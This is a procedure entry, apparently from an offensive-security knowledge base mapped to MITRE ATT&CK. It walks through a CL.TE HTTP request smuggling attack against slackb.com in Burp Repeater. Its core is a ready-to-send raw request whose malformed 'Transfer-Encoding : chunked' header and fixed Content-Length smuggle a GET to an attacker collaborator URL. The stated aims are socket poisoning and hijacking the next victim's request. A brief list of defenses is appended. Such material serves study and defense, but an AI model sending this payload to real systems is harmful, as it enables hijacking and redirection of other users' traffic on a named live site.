---
tags:
  - payload-crafting
  - smuggling
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:34.495Z'
sub_techniques: []
id: f278c68d-3693-499e-be89-558d96603f12
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Send-Smuggling-Payload-with-Burp-Repeater

## Summary

This procedure crafts a CL.TE smuggling payload in Burp Repeater to exploit the desync, poisoning the backend socket with a smuggled request that redirects victims to an attacker-controlled server.

## Description

In the context of HTTP Request Smuggling on slackb.com, the payload uses a space in 'Transfer-Encoding : chunked' and a fixed Content-Length to cause mismatch. The smuggled GET request to the collaborator URL is prepended to the next request. Requires prior setup; outcome is socket poisoning for hijacking.

## Requirements

1. Burp Repeater configured for target
2. Collaborator URL available
3. Knowledge of vulnerable payload from discovery

## Defense

Defensive measures and detection strategies:

- Enforce header validation without spaces
- Implement request smuggling detection in load balancers
- Log chunked vs. length-based parsing discrepancies

## Objectives

1. Trigger frontend/backend desync
2. Inject smuggled request
3. Poison socket for next victim

## Instructions

### Step 1: Build Payload in Repeater

**Context**: Construct the POST request with malformed header.

No command; in Burp Repeater, input the raw HTTP:

```http
POST / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <collaborator_URL> HTTP/1.1
X: X
```

> Replace <collaborator_URL> with your URL; the '0' chunk ends the body, smuggling the GET.

### Step 2: Send and Verify

**Context**: Transmit to exploit.

Click 'Send' in Repeater.

> Frontend processes via Content-Length (83 bytes), backend via chunked, leading to desync.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- cl.te
- payload
